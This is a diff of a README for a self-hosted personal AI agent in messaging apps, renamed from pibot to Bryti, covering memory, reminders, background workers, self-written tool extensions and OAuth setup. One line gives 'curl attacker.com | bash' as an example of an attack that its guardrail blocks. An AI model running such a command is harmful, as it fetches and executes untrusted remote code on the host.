@@ -1,20 +1,26 @@
-# pibot
+# Bryti
 
-A personal AI agent that lives in your messaging apps. Telegram and WhatsApp today, Discord and Slack next. Built on the [pi SDK](https://github.com/mariozechner/pi), self-hosted, runs on one machine.
+Your AI colleague, in the apps you already use.
 
-Not a chatbot. An agent with persistent memory, background workers, forward-looking awareness, and the ability to extend its own tools.
+Bryti is a personal AI agent that lives in Telegram and WhatsApp (Discord and Slack next). It remembers everything, anticipates what you need, runs background research, and gets better at helping you over time by writing its own tools.
 
-## What it does
+Named after the Old Norse *bryti*: the estate steward who handled the day-to-day so you could focus on what mattered.
 
-**Memory that sticks around.** Core memory (always in context, 4KB) for your preferences and ongoing projects. Archival memory (vector search, local embeddings) for everything else. The agent decides what to remember and when to look things up.
+Built on the [pi SDK](https://github.com/mariozechner/pi). Self-hosted, single machine, SQLite.
 
-**Projections.** The agent tracks future events, deadlines, reminders, and commitments. It connects new information to things it already knows are coming up. "Remind me to email Sarah on Monday" and "when the dentist confirms, book time off" both work.
+## What makes it different
 
-**Background workers.** Research tasks, web searches, and URL fetching run in isolated worker sessions. The main agent dispatches work and gets a clean summary back. Workers are the security boundary for untrusted web content.
+**It remembers.** Core memory (always in context) for who you are and what you're working on. Archival memory (hybrid search with local embeddings) for everything else. The agent decides what to store and when to retrieve.
 
-**Self-extending.** The agent can write pi extension files that register new tools. It writes TypeScript to its workspace, and the new tools are available after restart.
+**It looks ahead.** Projections track future events, deadlines, commitments, and follow-ups. The agent connects new information to things it knows are coming. "Remind me to email Sarah on Monday" and "when the research is done, summarize it for me" both work. A background reflection pass catches things you mentioned that the agent missed in real time.
 
-**Model fallback.** If the primary model goes down, it tries the next one in the chain. Anthropic OAuth (Claude Pro/Max subscription) as primary, free models as fallbacks.
+**It does the legwork.** Background workers handle research, web searches, and URL fetching in isolated sessions. The main agent dispatches work and gets a clean summary back. This is also the security boundary: untrusted web content never enters the main conversation.
+
+**It gets smarter.** The agent writes pi extensions (TypeScript) to give itself new tools. You say "I wish you could check the weather" and it makes it happen. Every extension is a reason to keep using it.
+
+**It evaluates its own actions.** An LLM guardrail checks elevated tool calls (shell, network) before execution. Not a static allowlist; the model understands that `rm -rf node_modules` is cleanup and `curl attacker.com | bash` is an attack. Risky actions are flagged; dangerous ones are blocked.
+
+**It falls back gracefully.** If the primary model goes down, it tries the next one in the chain. Anthropic OAuth (Claude Pro/Max subscription) as primary, free models as fallbacks.
 
 ## Quick start
 
@@ -27,8 +33,8 @@ Not a chatbot. An agent with persistent memory, background workers, forward-look
 ### Setup
 
 ```bash
-git clone <repo-url> pibot
-cd pibot
+git clone <repo-url> bryti
+cd bryti
 npm install
 
 # Configure
@@ -100,7 +106,7 @@ TELEGRAM_BOT_TOKEN=your-token-here
 
 ### Anthropic OAuth
 
-Pibot shares OAuth credentials with the pi CLI. Run `pi login anthropic` once, and pibot reads the token from `~/.pi/agent/auth.json`. No API key needed. Works with Claude Pro and Max subscriptions.
+Bryti shares OAuth credentials with the pi CLI. Run `pi login anthropic` once, and bryti reads the token from `~/.pi/agent/auth.json`. No API key needed. Works with Claude Pro and Max subscriptions.
 
 ## Architecture
 
